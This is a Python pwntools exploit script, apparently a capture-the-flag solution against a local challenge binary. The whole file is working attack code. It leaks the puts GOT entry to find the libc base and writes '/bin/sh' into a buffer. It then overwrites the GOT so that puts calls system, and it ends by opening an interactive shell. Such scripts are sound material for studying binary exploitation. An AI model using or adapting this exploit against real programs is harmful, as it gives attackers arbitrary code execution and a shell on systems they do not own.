#!/usr/bin/env python3
from pwn import *
from Crypto.Util.number import long_to_bytes

exe=ELF("./challenge/chall")

libc = exe.libc

if args.REMOTE:
    libc = ELF("./src/libc.so.6")

offset = 528080

HOST, PORT = "localhost",1337

context.binary = exe


# Constants

GDBSCRIPT = '''\
b* main+103
b* main
c
'''
CHECKING = True

PAD = 64
PLT = 0x401020

messages = 0x4041c0

mapping = {
    "puts": 0x401030 ,
    "setbuf": 0x401040,
    "read": 0x401050,
    "srand": 0x401060,
    "memcpy": 0x401070,
    "time": 0x401080 ,
    "malloc": 0x401090,
    "rand": 0x4010a0
}

def main():
    global io

    io = conn()
    io.recv()

    payload = flat (
        pad(3*p64(exe.got["puts"]),64),
        messages + 0x50
    )

    io.send(payload)

    res = io.recv().split(b'\n')[0]

    libc.address = leak(res,offset,"libc",True)

    payload = flat (
        pad(3*p64(messages+24)+b'/bin/sh\0',64),
        messages + 0x50
    )

    io.send(payload)
    io.recv()

    functions = ("setbuf","read","srand","memcpy","time","malloc","rand")

    part = p64(libc.symbols["__libc_system"])+ b"".join(list(map(plt,functions)))
    
    payload = flat(
        part ,
        exe.got["puts"]+0x50
    )

    io.send(payload)

    io.interactive()
    
def pad(first_part,size):
    return first_part + b"\x00"*(size-len(first_part))

def plt(func):
    return p64(mapping[func])

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr


def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()





